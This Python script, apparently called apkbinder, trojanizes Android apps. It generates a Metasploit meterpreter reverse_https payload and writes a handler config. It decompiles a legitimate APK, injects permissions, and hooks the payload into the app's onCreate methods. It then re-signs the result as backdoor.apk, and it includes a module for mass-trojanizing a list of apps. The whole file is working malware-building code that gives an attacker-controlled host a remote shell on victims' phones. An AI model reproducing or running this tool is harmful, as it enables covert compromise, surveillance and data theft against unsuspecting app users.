#!/usr/bin/python
# -*- coding: utf-8 -*-
# PoC apkbinder
# created by vay3t & 4c1d0_b1n4r10
# Programa bajo licencia GPLv3 2015-2016 (c)
# based by https://github.com/nodoraiz/AndroidAnalysis/blob/master/modify.py

import os
import re
import shutil
import zipfile
import tempfile
import argparse

pwd=os.getcwd()

def lista_a_string(array):
	crear_string="".join(array)
	return crear_string

def reverse(array):
	return array[::-1]

def remove_from_zip(zipfname, *filenames):
    tempdir = tempfile.mkdtemp()
    try:
        tempname = os.path.join(tempdir, 'new.zip')
        with zipfile.ZipFile(zipfname, 'r') as zipread:
            with zipfile.ZipFile(tempname, 'w') as zipwrite:
                for item in zipread.infolist():
                    if item.filename not in filenames:
                        data = zipread.read(item.filename)
                        zipwrite.writestr(item, data)
        shutil.move(tempname, zipfname)
    finally:
        shutil.rmtree(tempdir)

def generate_meterpreter(host,port):
	os.system("msfvenom -p android/meterpreter/reverse_https LHOST="+host+" LPORT="+port+" R > meterpreter.apk ")
	if os.path.exists("handler.rc"):
		os.system("rm handler.rc")
	handler=open("handler.rc","w")
	handler.write("use exploit/multi/handler\n")
	handler.write("set payload android/meterpreter/reverse_https\n")
	handler.write("set LHOST "+host+"\n")
	handler.write("set LPORT "+port+"\n")
	handler.write("exploit -j")
	handler.close()

def inyeccion_permisos():
	if not os.path.exists("permisos.xml"):
		print "[!] Where it's permisos.xml?"
		exit()
	os.system("apktool d "+pwd+"/app-debug.apk -o "+pwd+"/app-debug-dir")
	doc_manifest=open("app-debug-dir/AndroidManifest.xml","r")
	doc_permisos=open("permisos.xml","r")
	lista_manifest=doc_manifest.readlines()
	lista_permisos=doc_permisos.readlines()
	doc_permisos.close()
	doc_manifest.close()
	lista_final=[]
	lista_final.append(lista_manifest[0])
	lista_final.append(lista_manifest[1])
	for permiso in lista_permisos:
		lista_final.append(permiso)
	long_manifest=len(lista_manifest)
	a=2
	while a<long_manifest:
		lista_final.append(lista_manifest[a])
		a=a+1
	nuevo_manifest=open("AndroidManifest-new.xml","w")
	for manifest in lista_final:
		nuevo_manifest.write(manifest)
	nuevo_manifest.close()
	os.system("rm app-debug-dir/AndroidManifest.xml")
	os.system("mv AndroidManifest-new.xml app-debug-dir/AndroidManifest.xml")
	os.system("apktool b "+pwd+"/app-debug-dir -o "+pwd+"/app-debug-manifest.apk")

def integracion_meterpreter():
	if not os.path.exists("app-debug.apk"):
		print "[!] Where it's app-debug.apk?"
		exit()
	os.system("d2j-dex2jar -f app-debug.apk")
	os.system("d2j-jar2jasmin -f app-debug-dex2jar.jar")
	os.system("d2j-dex2jar -f meterpreter.apk")
	os.system("d2j-jar2jasmin meterpreter-dex2jar.jar")
	linea1="aload 0"
	linea2="invokestatic com/metasploit/stage/Payload/start(Landroid/content/Context;)V"
	os.system("cd app-debug-dex2jar-jar2jasmin && grep -l -r ' onCreate(' >> ../jasmin.txt")
	doc_jasmin=open("jasmin.txt","r")
	lista_jasmin=doc_jasmin.readlines()
	doc_jasmin.close()
	os.system("rm jasmin.txt")
	patron_android=re.compile('android')
	listanueva_jasmin=[]
	for elemento_jasmin in lista_jasmin:
		searched_jasmin=patron_android.search(elemento_jasmin)
		if searched_jasmin==None:
			listanueva_jasmin.append(elemento_jasmin)
	doc_jasmin_filtered=open("jasmin_filtered.txt","w")
	for paths_jasmin in listanueva_jasmin:
		doc_jasmin_filtered.write(paths_jasmin)
	doc_jasmin_filtered.close()
	open_doc_jasmin_filtered=open("jasmin_filtered.txt","r")
	read_jasmin_filtered=open_doc_jasmin_filtered.readlines()
	open_doc_jasmin_filtered.close()
	os.system("rm jasmin_filtered.txt")
	for line_doc_jasmin in read_jasmin_filtered:
		strip_doc_jasmin=line_doc_jasmin.splitlines()
		string_doc_jasmin=lista_a_string(strip_doc_jasmin)
		file_jasmin=open("app-debug-dex2jar-jar2jasmin/"+string_doc_jasmin,"r")
		lines_file_jasmin=file_jasmin.readlines()
		file_jasmin.close()
		string_split=string_doc_jasmin.split("/")
		reversered=reverse(string_split)
		name=reversered[0]
		nueva_jasmin=[]
		for linea_jasmin in lines_file_jasmin:
			linea_jasmin_split=linea_jasmin.splitlines()
			linea_jasmin_string=lista_a_string(linea_jasmin_split)
			patron_oncreate=re.compile(" onCreate\(")
			searched_oncreate=patron_oncreate.search(linea_jasmin_string)
			inyect_linea_jasmin=linea_jasmin_string+"\n"
			if searched_oncreate!=None:
				nueva_jasmin.append(inyect_linea_jasmin)
				nueva_jasmin.append(linea1+"\n")
				nueva_jasmin.append(linea2+"\n")
			else:
				nueva_jasmin.append(inyect_linea_jasmin)
		replace_jasmin=open(name,"w")
		for linea_nueva_jasmin in nueva_jasmin:
			replace_jasmin.write(linea_nueva_jasmin)
		replace_jasmin.close()
		os.system("rm app-debug-dex2jar-jar2jasmin/"+string_doc_jasmin)
		os.system("mv "+name+" app-debug-dex2jar-jar2jasmin/"+string_doc_jasmin)
	if os.path.exists("app-debug-dir/com"):
		os.system("mv meterpreter-dex2jar-jar2jasmin/com/metasploit/ app-debug-dex2jar-jar2jasmin/com/metasploit")
	else:
		os.system("mkdir app-debug-dir/com")
		os.system("mv meterpreter-dex2jar-jar2jasmin/com/metasploit/ app-debug-dex2jar-jar2jasmin/com/metasploit")
	os.system("d2j-jasmin2jar -f app-debug-dex2jar-jar2jasmin/ -o app-debug-edited.jar")
	os.system("d2j-jar2dex -f app-debug-edited.jar -o classes.dex")
	shutil.copyfile('app-debug.apk', 'apk-debug-edited.apk')
	zip_out = zipfile.ZipFile('app-debug-manifest.apk')
	zip_out.extract('AndroidManifest.xml','.')
	zip_out.close()
	files_to_remove = ['classes.dex', 'AndroidManifest.xml']
	shutil.copyfile("app-debug.apk", "app-debug-edited.apk")
	zip_out = zipfile.ZipFile("app-debug-manifest.apk")
	zip_out.extract('AndroidManifest.xml','.')
	zip_out.close()
	files_to_remove = ['classes.dex', 'AndroidManifest.xml']
	remove_from_zip("app-debug-edited.apk", *files_to_remove)
	zip_in = zipfile.ZipFile("app-debug-edited.apk", "a")
	zip_in.write('classes.dex')
	zip_in.write('AndroidManifest.xml')
	zip_in.close()
	os.system('d2j-apk-sign -f -o backdoor.apk app-debug-edited.apk')

def remove_tmp_meterpreter():
	os.system("rm AndroidManifest.xml")
	os.system("rm apk-debug-edited.apk")
	os.system("rm app-debug-dex2jar.jar")
	os.system("rm -r app-debug-dex2jar-jar2jasmin")
	os.system("rm -r app-debug-dir")
	os.system("rm app-debug-edited.apk")
	os.system("rm app-debug-edited.jar")
	os.system("rm app-debug-manifest.apk")
	os.system("rm classes.dex")
	os.system("rm meterpreter-dex2jar.jar")
	os.system("rm -r meterpreter-dex2jar-jar2jasmin")
	os.system("rm meterpreter.apk")
	print "[*] Temp files removed"

def mass_trojanizer(): # Mass trojanizer module
	if not os.path.exists("mass_trojans"):
		os.system("mkdir mass_trojans")
	if not os.path.exists("list_apk.txt"):
		print "[!] Where it's list_apk.txt?"
		exit()
	list_orgin_apk=open("list_apk.txt","r")
	read_list=list_orgin_apk.readlines()
	list_orgin_apk.close()
	for path in read_list:
		string_path=lista_a_string(path.splitlines())
		if not os.path.exists(string_path):
			print "[!] Where it's "+string_path+"?"
			exit()		
		apk_name=string_path.split("/")[0::-1][0]
		string_path_list=string_path.split("/")
		del string_path_list[-1]
		solo_rute=[]
		for name_string_path in string_path_list:
			solo_rute.append(name_string_path+"/")
		solo_rute_string=lista_a_string(solo_rute)
		os.system("cp "+string_path+" "+pwd+"/")
		os.system("mv "+pwd+"/"+apk_name+" "+pwd+"/app-debug.apk")
		inyeccion_permisos()
		integracion_meterpreter()
		remove_tmp_meterpreter()
		os.system("mv "+pwd+"/backdoor.apk "+pwd+"/mass_trojans/"+apk_name)
		print "[*] => "+pwd+"/mass_trojans/"+apk_name+" created!"
	print "[*] handler saved in => "+pwd+"/handler.rc"
	print "[*] Happy Hunting"
	exit()

try:
	parser = argparse.ArgumentParser(description='Backdooring APK with meterpreter')
	parser.add_argument('-l','--lhost', help='LHOST select local host', required=True, dest='lhost')
	parser.add_argument('-p','--lport', help='LPORT select local port', required=False, default='443')
	#parser.add_argument('-m', '--mas-trojanizer', help='Massive trojanization module, you need edit file: list_apk.txt', action='store_true', default=False) # Mass trojanizer module
	args=parser.parse_args()
	host=args.lhost
	port=args.lport
	#mass_trojan=args.mas-trojanizer # Mass trojanizer module
	generate_meterpreter(host,port)
	#if mass_trojan: # Mass trojanizer module
		#mass_trojanizer() # Mass trojanizer module
	inyeccion_permisos()
	integracion_meterpreter()
	remove_tmp_meterpreter()
	print "[*] handler saved in => "+pwd+"/handler.rc"
	print "[*] => "+pwd+"/backdoor.apk created!"
	print "[*] Happy Hunting"
except KeyboardInterrupt:
	remove_tmp_meterpreter()
	print "[!] Cancelled"
